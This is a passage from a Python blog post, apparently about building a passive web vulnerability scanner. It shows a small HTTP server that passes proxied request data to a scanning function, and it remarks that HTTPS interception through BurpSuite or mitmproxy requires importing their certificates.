= receive_data['req_url'] req_headers, req_body = receive_data['req_headers'], receive_data['req_body'] req_host = receive_data['req_host'] req_method = receive_data['req_method'] data = receive_data['data'] content_deal(req_headers, req_host, req_method, postdata=req_body, uri=req_url, packet=data) self.wfile.write("POST request for &#123;&#125;".format(self.headers).encode('utf-8'))def run(server_class=HTTPServer, handler_class=S, port=8888): logging.basicConfig(level=logging.INFO) server_address = ('0.0.0.0', port) httpd = server_class(server_address, handler_class) logging.info('Starting httpd...\n') try: httpd.serve_forever() except KeyboardInterrupt: pass httpd.server_close() logging.info('Stopping httpd...\n')if __name__ == '__main__': from sys import argv if len(argv) == 2: run(port=int(argv[1])) else: run() The function content_deal() is declared in the passive scanner system which written in python. one last thing we should pay attention to is that if we decide to use BurpSuite to transfer the https data, we must import the BurpSuite certificate. Of course, in addition to using BurpSuite, we also have many other choices, such as sslsplit, mitmproxy…and we need to import the right certificates by the same.]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
</search>
